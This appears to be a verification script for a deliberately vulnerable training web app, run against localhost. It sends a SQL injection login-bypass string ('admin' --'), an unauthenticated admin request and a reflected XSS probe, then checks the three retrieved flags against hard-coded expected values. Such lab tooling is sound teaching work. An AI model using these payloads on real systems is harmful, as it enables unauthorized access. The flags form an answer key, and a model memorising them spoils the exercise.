#!/usr/bin/env python3
"""
verify.py - Probelauf-Check fuer vuln-web (reines Python 3.13 stdlib).

Zieht die drei Flags ueber ihre Ausnutzungspfade, vergleicht sie mit den
erwarteten Werten und meldet per Exit-Code:
    0  alle drei Flags gefunden und korrekt
    1  mindestens eine fehlt oder weicht ab

Start:   python verify.py            (Standardport 8000)
         python verify.py 8080       (eigener Port)

Setzt voraus, dass app.py bereits laeuft.
"""

from __future__ import annotations

import re
import sys
import urllib.error
import urllib.parse
import urllib.request

# Erwartete Flags - muessen zu app.py passen.
EXPECTED = {
    "SQLi (Login)":      "FLAG{sqli-login-bypass-7Qk2pL}",
    "BAC  (Admin)":      "FLAG{broken-access-admin-9Lm5xR}",
    "XSS  (Reflected)":  "FLAG{reflected-xss-3Zt8wN}",
}

FLAG_RE = re.compile(r"FLAG\{[^}]*\}")


def fetch(url: str, data: bytes | None = None) -> str:
    """Holt eine URL und gibt den Body zurueck ('' bei Netz-/HTTP-Fehler)."""
    req = urllib.request.Request(url, data=data, method="POST" if data else "GET")
    try:
        with urllib.request.urlopen(req, timeout=5) as resp:
            return resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as exc:
        # Auch Fehlerseiten (z. B. 401) koennen relevanten Inhalt tragen.
        return exc.read().decode("utf-8", "replace")
    except (urllib.error.URLError, OSError) as exc:
        print(f"  ! Verbindungsfehler fuer {url}: {exc}", file=sys.stderr)
        return ""


def first_flag(body: str) -> str | None:
    match = FLAG_RE.search(body)
    return match.group(0) if match else None


def main() -> int:
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8000
    base = f"http://127.0.0.1:{port}"

    # Je Schwachstelle der Ausnutzungspfad aus der README.
    login_body = urllib.parse.urlencode(
        {"username": "admin' --", "password": "x"}
    ).encode("utf-8")

    results = {
        "SQLi (Login)":     first_flag(fetch(f"{base}/login", data=login_body)),
        "BAC  (Admin)":     first_flag(fetch(f"{base}/admin")),
        "XSS  (Reflected)": first_flag(
            fetch(f"{base}/hello?name=" + urllib.parse.quote("<b>x</b>"))
        ),
    }

    print(f"vuln-web Probelauf gegen {base}")
    all_ok = True
    for name, expected in EXPECTED.items():
        got = results[name]
        if got == expected:
            print(f"  [OK]   {name}: {got}")
        elif got is None:
            print(f"  [FEHLT] {name}: keine Flag erhalten (erwartet {expected})")
            all_ok = False
        else:
            print(f"  [ABW]  {name}: {got} (erwartet {expected})")
            all_ok = False

    print("Ergebnis:", "GRUEN - alle drei Flags" if all_ok else "ROT - unvollstaendig")
    return 0 if all_ok else 1


if __name__ == "__main__":
    sys.exit(main())
